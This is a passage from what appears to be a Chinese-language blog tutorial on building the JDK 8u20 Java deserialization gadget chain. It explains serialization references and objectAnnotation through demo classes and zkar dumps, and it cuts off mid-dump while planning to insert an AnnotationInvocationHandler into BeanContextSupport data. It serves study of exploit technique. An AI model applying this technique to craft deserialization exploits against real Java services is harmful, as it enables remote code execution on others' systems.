&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>一次序列化以后产生的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double1.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br><br></code></pre></td></tr></table></figure><p>修改代码后使其二次序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double2.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double2.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br><br></code></pre></td></tr></table></figure><p>发现多了这一个地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">TC_REFERENCE - <span class="hljs-number">0x71</span><br>  <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>  <br></code></pre></td></tr></table></figure><p>这里对应的就是前文基础知识里“序列化中的两个机制”中引用机制里的一段话</p><blockquote><p>每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p></blockquote><p>那么反序列化是如何处理<code>TC_REFERENCE</code>块的呢？</p><p>在<code>readObject0</code>方法里有这样的一个判断：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">case</span> TC_REFERENCE:<br><span class="hljs-keyword">return</span> readHandle(unshared)<br></code></pre></td></tr></table></figure><p>是的，在反序列化的流程中，进入了<code>readObject0</code>方法后，会判断读取的字节流中是否有<code>TC_REFERENCE</code>标识，如果有，那么会调用<code>readHandle</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readHandle</span><span class="hljs-params">(<span class="hljs-type">boolean</span> unshared)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>();<br>       &#125;<br>       passHandle = bin.readInt() - baseWireHandle;<br>       <span class="hljs-keyword">if</span> (passHandle &lt; <span class="hljs-number">0</span> || passHandle &gt;= handles.size()) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>               String.format(<span class="hljs-string">&quot;invalid handle value: %08X&quot;</span>, passHandle +<br>               baseWireHandle));<br>       &#125;<br>       <span class="hljs-keyword">if</span> (unshared) &#123;<br>           <span class="hljs-comment">// REMIND: what type of exception to throw here?</span><br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<br>               <span class="hljs-string">&quot;cannot read back reference as unshared&quot;</span>);<br>       &#125;<br><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> handles.lookupObject(passHandle);<br>       <span class="hljs-keyword">if</span> (obj == unsharedMarker) &#123;<br>           <span class="hljs-comment">// REMIND: what type of exception to throw here?</span><br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<br>               <span class="hljs-string">&quot;cannot read back reference to unshared object&quot;</span>);<br>       &#125;<br>       <span class="hljs-keyword">return</span> obj;<br>   &#125;<br></code></pre></td></tr></table></figure><p>这个方法会从字节流中读取<code>TC_REFERENCE</code>标记段，它会把读取的引用<code>Handle</code>赋值给<code>passHandle</code>变量，然后传入<code>lookupObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Object <span class="hljs-title function_">lookupObject</span><span class="hljs-params">(<span class="hljs-type">int</span> handle)</span> &#123;<br>    <span class="hljs-keyword">return</span> (handle != NULL_HANDLE &amp;&amp;<br>            status[handle] != STATUS_EXCEPTION) ?<br>        entries[handle] : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>lookupObject()</code>方法中，如果引用的<code>handle</code>不为空、没有关联的<code>ClassNotFoundException</code>（<code>status[handle] != STATUS_EXCEPTION</code>），那么就返回给定<code>handle</code>的引用对象，最后由<code>readHandle</code>方法返回给对象。</p><p>也就是说，反序列化流程还原到<code>TC_REFERENCE</code>的时候，会尝试还原引用的<code>handle</code>对象。</p><p>谈完了引用机制现在在来看数据插入的问题，<strong>如何能在类<code>AnnotationInvocationHandler</code>的序列化数据中插入一部分源代码中没有的数据？</strong></p><p>利用<code>objectAnnotation</code>！</p><h3 id="插入不存在数据"><a href="#插入不存在数据" class="headerlink" title="插入不存在数据"></a>插入不存在数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream output)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        output.defaultWriteObject();<br>        output.writeObject(<span class="hljs-string">&quot;Panda&quot;</span>);<br>        output.writeUTF(<span class="hljs-string">&quot;this is a test data&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double3.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在这个示例中，我们重写了<code>writeObject</code>方法，并且在该方法中利用<code>writeObject</code>和<code>writeUTF</code>方法写入了<code>Panda</code>对象以及<code>This is a test data!</code>字符串，该段序列化数据内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double3.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br>        <span class="hljs-meta">@ObjectAnnotation</span><br>          TC_STRING - <span class="hljs-number">0x74</span><br>            <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>            <span class="hljs-meta">@Value</span> - Panda - <span class="hljs-number">0x50</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> <span class="hljs-number">61</span><br>          TC_BLOCKDATA - <span class="hljs-number">0x77</span><br>            <span class="hljs-meta">@Blockdata</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">13</span> <span class="hljs-number">74</span> <span class="hljs-number">68</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">61</span> <span class="hljs-number">20</span> <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span> <span class="hljs-number">64</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span><br>          TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br><br><br></code></pre></td></tr></table></figure><p>使用beyondCompare比较他们之间的区别</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192151850.png" alt="image-20230415192151850"> </p><p>可以看到原先表示类描述信息标记由<code>0x02 - SC_SERIALIZABLE</code>变成了<code>0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</code>，并且在原有序列化数据结构的最下方还多了由<code>objectAnnotation</code>标识的内容段，这里的内容段会在反序列化的时候被还原</p><p><strong>为什么会有这种变化？</strong></p><p><strong>知识点1：</strong>如果一个可序列化的类重写了<code>writeObject</code>方法，而且向字节流写入了一些额外的数据，那么会设置<code>SC_WRITE_METHOD</code>标识，这种情况下，一般使用结束符<code>TC_ENDBLOCKDATA</code>来标记这个对象的数据结束；</p><p>所以图中出现了这样的变化</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192533851.png" alt="image-20230415192533851"> </p><p><strong>知识点2：</strong>如果一个可序列化的类重写了<code>writeObject</code>方法，在该序列化数据的<code>classdata</code>部分，还会多出个<code>objectAnnotation</code>部分，并且如果重写的<code>writeObject()</code>方法内除了调用<code>defaultWriteObject()</code>方法写对象字段数据，还向字节流中写入了自定义数据，那么在<code>objectAnnotation</code>部分会有写入自定义数据对应的结构和值；</p><p>正常情况下，我们没有办法修改可序列化类本身的内容，也就没办法重写这个类中的<code>writeObject</code>方法，也就没法让序列化数据中多出来<code>objectAnnotation</code>内容段</p><p>序列化数据只是一块二进制的数据而已，只要按照序列化预定的规则来修改其hex数据，那么实际上就是相当于在重写的<code>writeObject</code>方法中添加数据</p><p>在写入数据前，我们要考虑一件事，<strong>谁向谁写入数据？</strong>是先序列化<code>AnnotationInvocationHandler</code>类然后向其中插入<code>BeanContextSupport</code>对象，还是先序列化<code>BeanContextSupport</code>类然后向其中插入<code>AnnotationInvocationHandler</code>对象？</p><h3 id="payload产生（这里不知道为什么不能够RCE）"><a href="#payload产生（这里不知道为什么不能够RCE）" class="headerlink" title="payload产生（这里不知道为什么不能够RCE）"></a>payload产生（这里不知道为什么不能够RCE）</h3><p>先思考<code>jdk7u21</code>被修复的原因是什么？是因为在反序列化的过程中有异常抛出，从而导致反序列化的进程被终止了！</p><p>这让我们不得不联想到我们在基础知识的<code>Try/catch块的作用</code>中做的结论：</p><blockquote><p><strong>在一个存在<code>try ... catch</code>块的方法（无异常抛出）中去调用另一个存在<code>try ... catch</code>块的方法（有异常抛出），如果被调用的方法（有异常抛出）出错，那么会导致<code>调用方法</code>出错且不会继续执行完<code>调用方法</code>的代码逻辑，但是<code>不会</code>终止代码运行的进程</strong></p></blockquote><p>我们要的就是不要终止我们的反序列化进程，这样我们就可以取得反序列化后的类对象。</p><p>所以我们需要先序列化<code>BeanContextSupport</code>类（无异常抛出）然后向其中插入<code>AnnotationInvocationHandler</code>对象（有异常抛出）</p><p>这里还有一点要注意，因为根据<code>成员抛弃</code>机制我们知道，如果序列化流新增的这个值是一个对象的话，那么会为这个值分配一个<code> Handle</code>，但由于我们是手动插入<code>Handle</code>，所以需要修改引用<code>Handle</code>的值（就是<code>TC_ENDBLOCKDATA</code>块中<code>handle</code>的引用值）为<code>AnnotationInvocationHandler</code>对象的<code>handle</code>地址</p><p>所以我们先序列化BeanContextSupport类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">BeanContextSupport</span> <span class="hljs-variable">beanContextSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanContextSupport</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test1&quot;</span>));<br>        test1.writeObject(beanContextSupport);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>利用zkar读出数据结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\test1&quot;</span>      <br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">36</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">24</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.BeanContextSupport - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span 